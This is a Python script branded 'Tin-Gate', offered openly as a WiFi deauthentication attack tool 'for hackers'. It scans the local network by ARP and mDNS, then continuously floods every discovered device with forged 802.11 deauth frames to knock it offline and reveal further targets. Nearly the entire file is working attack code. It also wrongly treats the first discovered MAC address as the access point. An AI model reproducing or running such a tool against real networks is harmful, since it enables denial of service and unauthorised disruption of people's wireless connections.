import os
import threading
import time
import random
from scapy.all import *
from pythonping import ping
from queue import Queue

# ANSI escape codes for color
RED = "\033[0;31m"
GOLD = "\033[0;33m"
GRAY = "\033[0;90m"
RESET = "\033[0m"

attack_running = True  # Global variable to control the attack state
ping_queue = Queue()

def send_deauth_packet(interface, target_mac, access_point_mac):
    """Send deauthentication packets to the target MAC address."""
    dot11 = Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac)
    packet = RadioTap() / dot11 / Dot11Deauth()
    sendp(packet, iface=interface, count=20, inter=0.01, verbose=0)
    return f"{RED}Sent deauthentication packets to {target_mac}{RESET} associated with AP {access_point_mac}"

def live_attack(interface, target_macs, access_point_macs):
    """Continuously send deauth packets to the targets."""
    global attack_running
    loader_thread = threading.Thread(target=loader)
    loader_thread.start()

    try:
        while attack_running:
            threads = []
            for target_mac, access_point_mac in zip(target_macs, access_point_macs):
                thread = threading.Thread(target=send_deauth_packet, args=(interface, target_mac, access_point_mac))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            time.sleep(random.uniform(0.1, 0.5))  # Optional delay
    except KeyboardInterrupt:
        print(f"\n{RED}Rolling baack...!{RESET}")
    finally:
        attack_running = False

def loader():
    """Display a loading animation."""
    while attack_running:
        for symbol in "|/-\\":
            print(f"{GOLD}\rLoading... {symbol}{RESET}", end="")
            time.sleep(0.1)
    print(f"{GOLD}\rDeauth-Attack completed!{RESET}")

def print_banner():
    """Display the ASCII art banner."""
    banner = f"""
{GOLD}╔════════════════════╗{RESET}
{RED} ╔═╝  ▄▄▄▄▄▄    ▄▄▄▄▄▄  ╚═╗ {RESET}
{RED}╔╝ ▐██████████████████▌  ╚╗ {RESET}
{RED}║ ▐█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█▌ ║ {RESET}
{RED}║ ▐█  ████ ▄█  ██▀  ██ █▌ ║ {RESET}
{RED}║ ▐█   ▀█▀ ██ ▐█▀█▄ ██ █▌ ║ {RESET}
{RED}║ ▐█    █  ██ ▐█ ▀█ ██ █▌ ║ {RESET}
{RED}║ ▐█    █  ██ ▐█  █ ██ █▌ ║ {RESET}
{RED}║ ▐█    █  ▀█▄ ▀█▄▀ ██ █▌ ║ {RESET}
{RED}║ ▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▌ ║ {RESET}
{RED}╚╗ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ╔╝ {RESET}
{GOLD} ╚═╗     TIN -GATE    ╔═╝ {RESET}
{GOLD}   ╚════════════════════╝{RESET}
"""
    print(banner)

def perform_arp_scan(interface):
    """Performing ARP scan to detect targets on the network."""
    ip_range = f"{get_if_addr(interface)}/24"
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = srp(arp_request_broadcast, iface=interface, timeout=2, verbose=False)[0]
    devices = {}
    for element in answered_list:
        ip_address = element[1].psrc
        mac_address = element[1].hwsrc
        devices[ip_address] = mac_address
    return devices

def mdns_scan(interface):
    """Performing mDNS scan to discover devices."""
    print(f"{GOLD}Starting mDNS scan on {interface},please wait...{RESET}")

    # Create a multicast mDNS packet
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst="224.0.0.251") / UDP(sport=5353, dport=5353) / DNS(
        qr=0,  # Query
        rd=1,  # Recursion desired
        qd=DNSQR(qname="local.", qtype="PTR")  # Query for service records
    )

    # Send the mDNS packet and receive the response
    answered_list = srp(packet, iface=interface, timeout=2, verbose=False)[0]
    
    mdns_devices = {}
    for element in answered_list:
        ip_address = element[1][IP].src
        device_name = element[1][DNSRR].rrname.decode('utf-8')  # Get device name
        mdns_devices[ip_address] = device_name

    return mdns_devices

def scan_for_devices(interface):
    """Perform combined ARP scan, mDNS scan, SNMP sweep, and deauthentication attack."""
    print(f"{GOLD}Performing target scan on {interface},please wait...{RESET}")

    # Initial ARP scan
    arp_devices = perform_arp_scan(interface)
    print(f"{GOLD}Initial ARP scan detected {len(arp_devices)} devices.{RESET}")
    
    # Perform mDNS scan
    mdns_devices = mdns_scan(interface)
    print(f"{GOLD}mDNS scan detected {len(mdns_devices)} devices.{RESET}")
    
    # Combine detected devices
    combined_devices = {**arp_devices, **mdns_devices}

    # Perform a live deauthentication attack to force devices to reconnect
    if combined_devices:
        target_macs = list(combined_devices.values())
        access_point_mac = target_macs[0]  # Assuming the first MAC is the AP
        live_attack(interface, target_macs, [access_point_mac] * len(target_macs))

    # Re-scan for devices after the deauthentication attack
    new_arp_devices = perform_arp_scan(interface)
    new_mdns_devices = mdns_scan(interface)

    if len(new_arp_devices) > len(combined_devices):
        print(f"{GOLD}Deauth attack revealed additional targets!{RESET}")
    else:
        print(f"{RED}No additional targets detected after deauth attack.{RESET}")

    combined_devices.update(new_arp_devices)
    combined_devices.update(new_mdns_devices)

    print(f"{GOLD}Final targets detected on this network:{RESET}")
    for ip, mac in combined_devices.items():
        print(f"{GRAY}- IP: {ip}, MAC: {mac}{RESET}")

    return combined_devices

def main():
    os.system("clear")
    print_banner()  
    print(f"{GOLD}Welcome to Tin-Gate WiFi deauth-attack Tool for hackers by a Hacker{RESET}")
    print(f"{GRAY}“The night is darkest just before the dawn.”{RESET} – {RED}The Dark Knight{RESET}")
    print(f"{GRAY}Scripted by b0urn3 IG: onlybyhive Github: q4n0{RESET}\n")
    # Get Interfaces
    interfaces = get_if_list()
    print(f"{GOLD}Available interfaces:{RESET}")
    for index, interface in enumerate(interfaces):
        print(f"{GOLD}{index}: {interface}{RESET}")

    # Choose an interface to use
    while True:
        try:
            choice = int(input(f"{GOLD}Choose a network interface number: {RESET}"))
            if choice < 0 or choice >= len(interfaces):
                raise ValueError
            break
        except ValueError:
            print(f"{RED}You made a bad choice. Lets try that again.{RESET}")

    interface = interfaces[choice]
    devices = scan_for_devices(interface)

if __name__ == "__main__":
    main()
